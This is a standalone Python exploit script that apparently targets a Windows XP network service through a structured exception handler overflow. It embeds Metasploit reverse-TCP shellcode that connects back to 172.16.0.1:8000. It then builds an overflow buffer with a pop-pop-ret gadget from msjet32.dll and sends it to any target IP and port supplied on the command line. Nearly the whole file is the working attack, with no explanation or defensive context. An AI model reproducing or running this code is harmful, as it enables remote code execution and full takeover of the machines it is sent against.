"""
Tested OK against Windows XP [Version 5.1.2600] box

(c) h4lf-jiffie (dohmatob elvis dopgima)
"""

import os
import sys
import struct
import socket

# elvis@hell:~/CODE/injektors$ msfpayload windows/shell_reverse_tcp LHOST=172.16.0.1 LPORT=8000 C
# /*
#  * windows/shell_reverse_tcp - 314 bytes
#  * http://www.metasploit.com
#  * VERBOSE=false, LHOST=172.16.0.1, LPORT=8000, 
#  * ReverseConnectRetries=5, EXITFUNC=process, 
#  * InitialAutoRunScript=, AutoRunScript=
#  */
reverse_tcp_EGG = (
"\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30"
"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
"\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2"
"\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85"
"\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3"
"\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d"
"\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58"
"\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b"
"\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff"
"\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x33\x32\x00\x00\x68"
"\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8\x90\x01"
"\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00\xff\xd5\x50\x50"
"\x50\x50\x40\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x89\xc7"
"\x68\xac\x10\x00\x01\x68\x02\x00\x1f\x40\x89\xe6\x6a\x10\x56"
"\x57\x68\x99\xa5\x74\x61\xff\xd5\x68\x63\x6d\x64\x00\x89\xe3"
"\x57\x57\x57\x31\xf6\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44\x24"
"\x3c\x01\x01\x8d\x44\x24\x10\xc6\x00\x44\x54\x50\x56\x56\x56"
"\x46\x56\x4e\x56\x56\x53\x56\x68\x79\xcc\x3f\x86\xff\xd5\x89"
"\xe0\x4e\x56\x46\xff\x30\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0"
"\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80"
"\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5")

if __name__ == '__main__':
    # sanitize command-line
    print "\r\n\t\t-+[ %s by h4lf-jiffie (dohmatob elvis dopgima) ]+-\r\n"%os.path.basename(sys.argv[0])
    if len(sys.argv) < 3:
        print 'Usage: python %s [OPTIONS] <target_IP> <target_PORT>'%(sys.argv[0])
        sys.exit(1)
    sys.path.append("../encoders")
    quine = __import__("quine")

    # set SEH record
    pointer_to_next_SEH_record = 0x04EB4141 # = nop+nop+shortjmp 
    SE_handler = 0x1B119FFC # = address of popr32+popr32+ret in msjet32.dll (this wll overwrite the existing handler)
        
    # sum-up SEH stuff
    seh_gadget = struct.pack('<I', pointer_to_next_SEH_record) 
    seh_gadget += struct.pack('<I', SE_handler)

    # setup socket
    soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    soc.connect((sys.argv[1], int(sys.argv[2])))

    # build request
    probe_pkt = 'USV '
    probe_pkt += 'A'*(966 - len(probe_pkt)) # alphanum padding 
    probe_pkt += seh_gadget # pointer to next SEH record is overwritten 574 bytes into the request buffer
    probe_pkt += quine.encode(reverse_tcp_EGG)
    probe_pkt += 'A'*(2500 + 4 - len(probe_pkt)) # padding
    probe_pkt += '\r\n\r\n'

    # fuzz (sorry, I meant 'xploit')
    print 'PROBE PACKET (%d bytes):'%len(probe_pkt)
    print probe_pkt
    soc.send(probe_pkt)

    # sanity
    soc.close()
